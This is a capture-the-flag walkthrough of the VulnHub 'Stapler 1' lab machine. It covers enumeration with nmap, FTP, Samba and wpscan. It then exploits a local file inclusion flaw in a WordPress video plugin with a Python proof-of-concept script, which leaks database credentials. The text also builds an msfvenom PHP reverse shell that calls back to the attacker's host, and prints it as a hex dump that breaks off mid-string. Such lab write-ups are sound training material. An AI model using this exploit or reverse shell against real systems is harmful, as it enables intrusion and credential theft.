</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>

<span class="c"># cd /root</span>
<span class="nb">cd</span> /root
<span class="c"># ls</span>
<span class="nb">ls
</span>flag.txt
<span class="c"># cat flag.txt</span>
<span class="nb">cat </span>flag.txt
Hello and welcome.
You successfully compromised the company <span class="s2">"JABC"</span> and the server completely <span class="o">!!</span>
Congratulations <span class="o">!!!</span>
Hope you enjoyed it.

What <span class="k">do </span>you think of A.I.?
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - Stapler 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is a vulnerable VM that can to be owned in many ways.</p>

<p><strong>Author:</strong> g0tmi1k</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/stapler-1,150/">https://www.vulnhub.com/entry/stapler-1,150/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>The target host was discovered with netdiscover.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.0/24      
 Currently scanning: Finished!   |   Screen View: Unique Hosts             
                                                                           
 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 210        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.179.171 08:00:27:f9:70:14      2      84  PCS Systemtechnik GmbH    
 192.168.179.254 00:50:56:fb:8c:55      3     126  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan reveals many open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-p1-65535</span> <span class="nt">--open</span> 192.168.179.171 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
139/tcp   open  netbios-ssn
666/tcp   open  doom
3306/tcp  open  mysql
12380/tcp open  unknown
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>In order to discover more information about the open ports, an aggressive scan was performed with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p21</span>,22,53,80,139,666,3306,12380 192.168.179.171 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_Can<span class="s1">'t get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.179.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open  domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp    open  http        PHP cli server 5.5 or later
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open  doom?
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&amp;M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 37
|   Capabilities flags: 63487
|   Some Capabilities: SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolOld, SupportsCompression, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSigpipes, Support41Auth, InteractiveClient, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongPassword, ConnectWithDatabase, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: OG/\x0F*L\x0Bimr{V\x17\x0CM3a4aq
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
</span></code></pre></div></div>

<h3 id="ftp-enumeration">FTP Enumeration</h3>

<p>The anonymous login is available, so we can try to access the FTP service and download the note file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ftp 192.168.179.171
Connected to 192.168.179.171.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show <span class="nb">who </span>has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name <span class="o">(</span>192.168.179.171:s4rgaz<span class="o">)</span>: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 04  2016 <span class="nb">.</span>
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ..
<span class="nt">-rw-r--r--</span>    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp&gt; get note
<span class="nb">local</span>: note remote: note
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>note <span class="o">(</span>107 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
107 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>50.7983 kB/s<span class="o">)</span>
</code></pre></div></div>

<p>The note doesn’t say much, so we continue.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>note 
Elly, make sure you update the payload information. Leave it <span class="k">in </span>your FTP account once your are <span class="k">done</span>, John.
</code></pre></div></div>

<h3 id="samba-enumeration">Samba Enumeration</h3>

<p>The scan with enum4linux reveals two shared folders and a large list of system users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.171
...
 <span class="o">============================================</span>                                                                                                                       
|    Share Enumeration on 192.168.179.171    |                                                                                                                      
 <span class="o">============================================</span>                                                                                                                       
                                                                                                                                                                    
        Sharename       Type      Comment                                                                                                                           
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>                                                                                                                           
        print<span class="nv">$ </span>         Disk      Printer Drivers                                                                                                                   
        kathy           Disk      Fred, What are we doing here?                                                                                                     
        tmp             Disk      All temporary files should be stored here                                                                                         
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>red server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
...
<span class="o">[</span>+] Enumerating <span class="nb">users </span>using SID S-1-22-1 and logon username <span class="s1">''</span>, password <span class="s1">''</span>                                                                                         
S-1-22-1-1000 Unix User<span class="se">\p</span>eter <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                          
S-1-22-1-1001 Unix User<span class="se">\R</span>Nunemaker <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                     
S-1-22-1-1002 Unix User<span class="se">\E</span>Tollefson <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                     
S-1-22-1-1003 Unix User<span class="se">\D</span>Swanger <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                       
S-1-22-1-1004 Unix User<span class="se">\A</span>Parnell <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                       
S-1-22-1-1005 Unix User<span class="se">\S</span>Hayslett <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                      
S-1-22-1-1006 Unix User<span class="se">\M</span>Bassin <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
S-1-22-1-1007 Unix User<span class="se">\J</span>Bare <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                          
S-1-22-1-1008 Unix User<span class="se">\L</span>Solum <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                         
S-1-22-1-1009 Unix User<span class="se">\I</span>Chadwick <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                      
S-1-22-1-1010 Unix User<span class="se">\M</span>Frei <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                          
S-1-22-1-1011 Unix User<span class="se">\S</span>Stroud <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
S-1-22-1-1012 Unix User<span class="se">\C</span>Ceaser <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
S-1-22-1-1013 Unix User<span class="se">\J</span>Kanode <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
S-1-22-1-1014 Unix User<span class="se">\C</span>Joo <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
S-1-22-1-1015 Unix User<span class="se">\E</span>eth <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
S-1-22-1-1016 Unix User<span class="se">\L</span>Solum2 <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                        
S-1-22-1-1017 Unix User<span class="se">\J</span>Lipps <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                         
S-1-22-1-1018 Unix User<span class="se">\j</span>amie <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                          
S-1-22-1-1019 Unix User<span class="se">\S</span>am <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
S-1-22-1-1020 Unix User<span class="se">\D</span>rew <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
S-1-22-1-1021 Unix User<span class="se">\j</span>ess <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
S-1-22-1-1022 Unix User<span class="se">\S</span>HAY <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                           
S-1-22-1-1023 Unix User<span class="se">\T</span>aylor <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                         
S-1-22-1-1024 Unix User<span class="se">\m</span>el <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
S-1-22-1-1025 Unix User<span class="se">\k</span>ai <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
S-1-22-1-1026 Unix User<span class="se">\z</span>oe <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
S-1-22-1-1027 Unix User<span class="se">\N</span>ATHAN <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                         
S-1-22-1-1028 Unix User<span class="se">\w</span>ww <span class="o">(</span>Local User<span class="o">)</span>                                                                                                                            
S-1-22-1-1029 Unix User<span class="se">\e</span>lly <span class="o">(</span>Local User<span class="o">)</span>
...
</code></pre></div></div>

<p>As is possible the null session I decided to mount the shared folder kathy to the attacking machine, the backup directory contains a FTP configuration file and a compressed copy of wordpress.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>mount <span class="nt">-t</span> cifs //192.168.179.171/kathy /mnt/smb <span class="nt">-o</span> <span class="s1">'username=anonymous,password=,rw,vers=1.0'</span>
root@kali:~<span class="nv">$ </span><span class="nb">cd</span> /mnt/smb
root@kali:/mnt/smb<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 4
drwxr-xr-x+ 4 root root    0 Jun  3  2016 <span class="nb">.</span>
drwxr-xr-x  8 root root 4096 Oct 12 07:05 ..
drwxr-xr-x+ 2 root root    0 Jun  5  2016 backup
drwxr-xr-x+ 2 root root    0 Jun  5  2016 kathy_stuff
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p><strong>Enumeration on port 12380</strong></p>

<p>The web page shows nothing.</p>

<p><img src="/assets/images/stapler/screenshot-1.png" alt="" /></p>

<p>An scan with nikto reveals that the page uses SSL, and also detected two web directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nikto <span class="nt">-host</span> http://192.168.179.171:12380/
...
+ Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header <span class="s1">'dave'</span> found, with contents: Soemthing doesn<span class="s1">'t look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '</span><span class="nt">-C</span> all<span class="s1">' to force check all possible dirs)
+ Entry '</span>/admin112233/<span class="s1">' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '</span>/blogblog/<span class="s1">' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Hostname '</span>192.168.179.171<span class="s1">' does not match certificate'</span>s names: Red.Initech
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Uncommon header <span class="s1">'x-ob_mode'</span> found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
</code></pre></div></div>

<p>The <strong>/blogblog</strong> directory displays a wordpress web page.</p>

<p><img src="/assets/images/stapler/screenshot-2.png" alt="" /></p>

<p>Wpscan detected directory listing and a long list of wordpress users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--disable-tls-checks</span> <span class="nt">--url</span> https://192.168.179.171:12380/blogblog/  <span class="nt">-e</span> at, ap, u
...
<span class="o">[</span>+] Upload directory has listing enabled: https://192.168.179.171:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%
 ...
 <span class="o">[</span>+] WordPress version 4.2.1 identified <span class="o">(</span>Insecure, released on 2015-04-27<span class="o">)</span><span class="nb">.</span>
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  - https://192.168.179.171:12380/blogblog/?feed<span class="o">=</span>rss2, &lt;generator&gt;http://wordpress.org/?v<span class="o">=</span>4.2.1&lt;/generator&gt;
 |  - https://192.168.179.171:12380/blogblog/?feed<span class="o">=</span>comments-rss2, &lt;generator&gt;http://wordpress.org/?v<span class="o">=</span>4.2.1&lt;/generator&gt;
...
<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] John Smith
 | Found By: Author Posts - Display Name <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confirmed By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>

<span class="o">[</span>+] elly
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] john
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] peter
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] barry
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] heather
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] garry
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] harry
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] scott
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] kathy
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] tim
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span> 
</code></pre></div></div>

<p>With a manual enumeration was possible detect a vulnerable plugin called Advanced Video.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://192.168.179.171:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
</code></pre></div></div>

<p><img src="/assets/images/stapler/screenshot-3.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit wordpress advanced video
<span class="nt">----------------------------------------------------------------------------</span> <span class="nt">------------------------------</span>
 Exploit Title                                                              |  Path
<span class="nt">----------------------------------------------------------------------------</span> <span class="nt">------------------------------</span>
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                  | php/webapps/39646.py
<span class="nt">----------------------------------------------------------------------------</span> <span class="nt">------------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="local-file-inclusion">Local File Inclusion</h3>

<p>WordPress Plugin Adavnced Video embed is prone to a Local File Inclusion vulnerability because it fails to sufficiently verify user-supplied input.</p>

<p>We copy the exploit to our current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/39646.py
</code></pre></div></div>

<p>The exploit doesn’t work and also it’s deprecated, so I will manually exploit it and try to read the wp-config.php file, to that we request the following link in the browser.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://192.168.179.171:12380/blogblog/wp-admin/admin-ajax.php?action<span class="o">=</span>ave_publishPost&amp;title<span class="o">=</span>random&amp;short<span class="o">=</span>1&amp;term<span class="o">=</span>1&amp;thumb<span class="o">=</span>../wp-config.php
</code></pre></div></div>

<p>As we can see the request was pocessed correctly.</p>

<p><img src="/assets/images/stapler/screenshot-4.png" alt="" /></p>

<p>Then we go to the home page, we can see that a new jpeg element was created.</p>

<p><img src="/assets/images/stapler/screenshot-5.png" alt="" /></p>

<p>We look for the link of the jpeg file with the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="s2">"https://192.168.179.171:12380/blogblog/"</span> | <span class="nb">grep</span> <span class="nt">-Po</span> <span class="s1">'http[^"]*jpeg'</span> | <span class="nb">head</span> <span class="nt">-1</span>  
https://192.168.179.171:12380/blogblog/wp-content/uploads/249816638.jpeg
</code></pre></div></div>

<p>Then we request the jpeg link with curl, and we get the content from the wp-content.php file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="s2">"https://192.168.179.171:12380/blogblog/wp-content/uploads/249816638.jpeg"</span>
...
define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'plbkac'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
...
</code></pre></div></div>

<p>Doing this manually is cumbersome, so I developed a python script to speed things up.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">sys</span>


<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">f"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> ../wp-content.php"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"https://192.168.179.171:12380/blogblog/"</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># Disable warnings 
</span><span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb="</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="k">if</span> <span class="s">'No such file'</span> <span class="ow">in</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"File not found"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">regx</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'http[^"]*jpeg'</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="n">link</span> <span class="o">=</span> <span class="n">regx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the script adding as parameter the file to include, in this case <strong>default-ssl-conf</strong> file to know the DocumentRoot.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 poc.py /etc/apache2/sites-available/default-ssl.conf
&lt;IfModule mod_ssl.c&gt;
	&lt;VirtualHost _default_:12380&gt;
		ServerAdmin garry@red

		DocumentRoot /var/www/https
...
</code></pre></div></div>

<p>We generate our php reverse shell with msfvenom.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_perl <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-o</span> back.door.php
</code></pre></div></div>

<p>We hex encode the php reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>xxd <span class="nt">-ps</span> back.door.php | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="p">;</span> <span class="nb">echo
</span>2f2a3c3f706870202f2a2a2f0a202020202020406572726f725f7265706f7274696e672830293b0a202020202020407365745f74696d655f6c696d69742830293b204069676e6f72655f757365725f61626f72742831293b2040696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b0a202020202020246f6367785a566d3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b0a20202020202069662821656d70747928246f6367785a566d29297b0a2020202020202020246f6367785a566d3d707265675f7265706c61636528272f5b2c205d2b2f272c20272c272c20246f6367785a566d293b0a2020202020202020246f6367785a566d3d6578706c6f646528272c272c20246f6367785a566d293b0a2020202020202020246f6367785a566d3d61727261795f6d617028277472696d272c20246f6367785a566d293b0a2020202020207d656c73657b0a2020202020202020246f6367785a566d3d617272617928293b0a2020202020207d0a2020202020202463203d206261736536345f6465636f64652827634756796243417454556c504943316c4943636b6344316d62334a724f325634615851736157596f4a4841704f79526a5057356c6479424a547a6f365532396a613256304f6a704a546b56554b46426c5a584a425a4752794c4349784f5449754d5459344c6a45334f5334784f6a51304d7949704f314e5552456c4f4c54356d5a4739775a57346f4a474d7363696b374a483474506d5a6b6233426c6269676b597978334b54747a65584e305a57306b5879423361476c735a54772b4f79633d27293b0a2020202020206966202846414c534520213d3d20737472706f7328737472746f6c6f776572285048505f4f53292c202777696e27202929207b0a202020202020202024633d24632e2220323e26315c6e223b0a2020202020207d0a202020202020244f447a633d2769735f63616c6c61626c65273b0a20202020202024426a4f44683d27696e5f6172726179273b0a2020202020200a202020202020696628244f447a632827706f70656e2729616e642124426a4f44682827706f70656e272c246f6367785a566d29297b0a20202020202020202466703d706f70656e2824632c277227293b0a202020202020202024656676614f623d4e554c4c3b0a202020202020202069662869735f7265736f757263652824667029297b0a202020202020202020207768696c65282166656f662824667029297b0a20202020202020202020202024656676614f622e3d6672656164282466702c31303234293b0a202020202020202020207d0a20202020202020207d0a20202020202020204070636c6f736528246670293b0a2020202020207d656c73650a202020202020696628244f447a63282770617373746872752729616e642124426a4f446828277061737374687275272c246f6367785a566d29297b0a20202020202020206f625f737461727428293b0a20202020202020207061737374687275282463293b0a202020202020202024656676614f623d6f625f6765745f636f6e74656e747328293b0a20202020202020206f625f656e645f636c65616e28293b0a2020202020207d656c73650a202020202020696628244f447a632827657865632729616e642124426a4f4468282765786563272c246f6367785a566d29297b0a202020202020202024656676614f623d617272617928293b0a2020202020202020657865632824632c24656676614f62293b0a202020202020202024656676614f623d6a6f696e28636872283130292c24656676614f62292e636872283130293b0a2020202020207d656c73650a202020202020696628244f447a63282773797374656d2729616e642124426a4f4468282773797374656d272c246f6367785a566d29297b0a20202020202020206f625f737461727428293b0a202020202020202073797374656d282463293b0a202020202020202024656676614f623d6f625f6765745f636f6e74656e747328293b0a20202020202020206f625f656e645f636c65616e28293b0a2020202020207d656c73650a202020202020696628244f447a6328277368656c6c5f657865632729616e642124426a4f446828277368656c6c5f65786563272c246f6367785a566d29297b0a202020202020202024656676614f623d7368656c6c5f65786563282463293b0a2020202020207d656c73650a202020202020696628244f447a63282770726f635f6f70656e2729616e642124426a4f4468282770726f635f6f70656e272c246f6367785a566d29297b0a20202020202